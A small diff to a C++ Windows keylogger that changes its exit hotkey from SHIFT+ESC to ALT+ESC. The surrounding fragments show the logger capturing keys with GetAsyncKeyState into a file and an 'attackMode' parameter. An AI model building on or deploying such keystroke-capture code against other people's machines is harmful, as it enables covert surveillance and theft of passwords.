@@ -49,7 +49,7 @@ int main() {
     Sleep(50);
     //call main function
     cout << "Keylogger started, will be saved to " << file << endl;
-    cout << ". . . X_X Press SHIFT+ESCAPE to exit X_X . . ." << endl << endl;
+    cout << ". . . X_X Press ALT+ESCAPE to exit X_X . . ." << endl << endl;
     CheckKeys(file, bisString, isString, isComment, attackMode);
 
     cout << endl << endl << "^o^ Cleaning up file ^o^" << endl;
@@ -149,8 +149,8 @@ void CheckKeys(string file, bool &bisString, int &isString, int &isComment, int 
                 {
                     FormatString(file, key, shift, ctrl);
                 }
-                //exit program if SHIFT+ESC is pressed
-                if(key == 0x1B && GetAsyncKeyState(VK_SHIFT) & 0x8000){
+                //exit program if ALT+ESC is pressed
+                if(key == 0x1B && GetAsyncKeyState(VK_MENU) & 0x8000){
                     fout.close();
                     return;
                 }
